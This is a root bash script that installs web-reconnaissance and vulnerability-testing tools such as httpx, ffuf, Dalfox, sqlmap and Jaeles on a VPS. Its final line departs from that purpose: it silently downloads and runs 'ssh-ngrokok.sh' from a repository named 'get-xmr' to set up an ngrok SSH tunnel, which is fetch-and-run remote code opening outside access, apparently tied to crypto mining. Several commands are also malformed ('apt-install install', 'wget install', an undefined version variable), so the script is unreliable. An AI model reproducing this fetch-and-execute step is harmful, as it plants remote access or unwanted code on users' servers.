#!/bin/bash -i

#Creating tools directory if not exist
mkdir -p /root/OK-VPS/tools /root/OK-VPS/tools/file /root/wordlist /root/templates;
clear;

ENVIRONMENT () {
    echo -e ${BLUE}"[ENVIRONMENT]" ${RED}"Packages required installation in progress ...";
        apt-get update -y > /dev/null 2>&1;
        apt get upgrade -y > /dev/null 2>&1;
        apt-get install python -y > /dev/null 2>&1;
        apt-get install python2 -y > /dev/null 2>&1;
        apt-get install python3 -y > /dev/null 2>&1;
        apt-get install pip -y > /dev/null 2>&1;
    apt-get install unzip -y > /dev/null 2>&1;
    apt install curl -y > /dev/null 2>&1;
    pip3 install colored  > /dev/null 2>&1;
    apt install snap -y > /dev/null 2>&1;
    apt install jq -y > /dev/null 2>&1;
    apt install python-pip -y > /dev/null 2>&1;
    apt install snapd -y > /dev/null 2>&1;
    apt install python3-pip -y > /dev/null 2>&1;
    pip3 install jsbeautifier > /dev/null 2>&1;
    pip3 install lxml > /dev/null 2>&1;
}
SUBDOMAINS_ENUMERATION () {
       #Golang
    echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Golang installation in progress ...";
    cd /root/OK-VPS/tools/file && wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz && tar -zxvf go1.20.5.linux-amd64.tar.gz -C /usr/local/ && mkdir ~/.go && GOROOT=/usr/local/go && GOPATH=~/.go && PATH=$PATH:$GOROOT/bin:$GOPATH/bin && update-alternatives --install "/usr/bin/go" "go" "/usr/local/go/bin/go" 0 && update-alternatives --set go /usr/local/go/bin/go;
    echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Recon-ng installation in progress ...";
    git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS
}
HTTP_PROBE () {
    #httpx
    echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httpx installation in progress ...";
    GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1 && ln -s ~/go/bin/httpx /usr/local/bin/;
    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"Httpx installation is done !"; echo "";
    #httprobe
    echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httprobe installation in progress ...";
    go install github.com/tomnomnom/httprobe@latest > /dev/null 2>&1 && ln -s ~/go/bin/httprobe /usr/local/bin/;
    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"httprobe installation is done !"; echo "";
}
WEB_CRAWLING () {
    #ParamSpider
    echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"ParamSpider installation in progress ...";
    cd /root/OK-VPS/tools && git clone https://github.com/devanshbatham/ParamSpider > /dev/null 2>&1 && cd ParamSpider && pip3 install -r requirements.txt 
    echo -e ${BLUE}"[WEB CRAWLING]" ${GREEN}"ParamSpider installation is done !"; echo "";
    #Waybackurls
    echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"Waybackurls installation in progress ...";
    go install github.com/tomnomnom/waybackurls@latest > /dev/null 2>&1 && ln -s ~/go/bin/waybackurls /usr/local/bin/;
    echo -e ${BLUE}"[WEB CRAWLING]" ${GREEN}"Waybackurls installation is done !"; echo "";
}

HTTP_PARAMETER () {
    #Arjun
    echo -e ${BLUE}"[HTTP PARAMETER DISCOVERY]" ${RED}"Arjun installation in progress ...";
    pip3 install arjun > /dev/null 2>&1;
    echo -e ${BLUE}"[HTTP PARAMETER DISCOVERY]" ${GREEN}"Arjun installation is done !"; echo "";
}
FUZZING_TOOLS () {
    #ffuf
    echo -e ${BLUE}"[FUZZING TOOLS]" ${RED}"ffuf installation in progress ...";
    go install github.com/ffuf/ffuf@latest > /dev/null 2>&1 && ln -s ~/go/bin/ffuf /usr/local/bin/;
    echo -e ${BLUE}"[FUZZING TOOLS]" ${GREEN}"ffuf installation is done !"; echo "";
}
API_TOOLS () {
    #Kiterunner
    echo -e ${BLUE}"[API TOOLS]" ${RED}"Kiterunner installation in progress ...";
    cd /root/OK-VPS/tools/file && wget install https://github.com/assetnote/kiterunner/releases/download/v"$KITERUNNERVER"/kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz > /dev/null 2>&1 && tar xvf kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz > /dev/null 2>&1 && mv kr /usr/local/bin;
    cd /root/OK-VPS/tools && mkdir -p kiterunner-wordlists && cd kiterunner-wordlists && wget install https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz > /dev/null 2>&1 && wget install https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz > /dev/null 2>&1 && for f in *.tar.gz; do tar xf "$f"; rm -Rf "$f"; done
    echo -e ${BLUE}"[API TOOLS]" ${GREEN}"Kiterunner installation is done !"; echo "";
}
VULNS_XSS () {
    #Dalfox
    echo -e ${BLUE}"[VULNERABILITY - XSS]" ${RED}"Dalfox installation in progress ...";
    GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest > /dev/null 2>&1 && ln -s ~/go/bin/dalfox /usr/local/bin/;
    echo -e ${BLUE}"[VULNERABILITY - XSS]" ${GREEN}"Dalfox installation is done !"; echo "";
}

VULNS_SQLI () {
    #SQLmap
    echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${RED}"SQLMap installation in progress ...";
    apt-install install -y sqlmap > /dev/null 2>&1
    echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${GREEN}"SQLMap installation is done !"; echo "";
    
}
VULNS_SCANNER () {
    #Jaeles
    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${RED}"Jaeles installation in progress ...";
    cd /root/OK-VPS/tools/file && wget https://github.com/jaeles-project/jaeles/releases/download/beta-v0.17/jaeles-v0.17-linux.zip > /dev/null 2>&1 && unzip jaeles-v0.17-linux.zip > /dev/null 2>&1 && mv jaeles /usr/local/bin/;
    cd /root/templates && git clone https://github.com/jaeles-project/jaeles-signatures.git > /dev/null 2>&1;
    cd /root/templates && git clone https://github.com/ghsec/ghsec-jaeles-signatures > /dev/null 2>&1;
    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${GREEN}"Jaeles installation is done !"; echo "";

}
USEFUL_TOOLS () {
    #anew
    echo -e ${BLUE}"[USEFUL TOOLS]" ${RED}"anew installation in progress ...";
    go install github.com/tomnomnom/anew@latest > /dev/null 2>&1 && ln -s ~/go/bin/anew /usr/local/bin/;
    echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"anew installation is done !"; echo "";

    #Tmux
    echo -e ${BLUE}"[USEFUL TOOLS]" ${RED}"Tmux installation in progress ...";
    apt-install install tmux -y > /dev/null 2>&1;
    echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"Tmux installation is done !"; echo "";
}
ENVIRONMENT && SUBDOMAINS_ENUMERATION && HTTP_PROBE && HTTP_PARAMETER && FUZZING_TOOLS && API_TOOLS  && VULNS_XSS && VULNS_SQLI && VULNS_SCANNER && USEFUL_TOOLS;
echo -e "setup ngrok ssh tunnel..."
wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
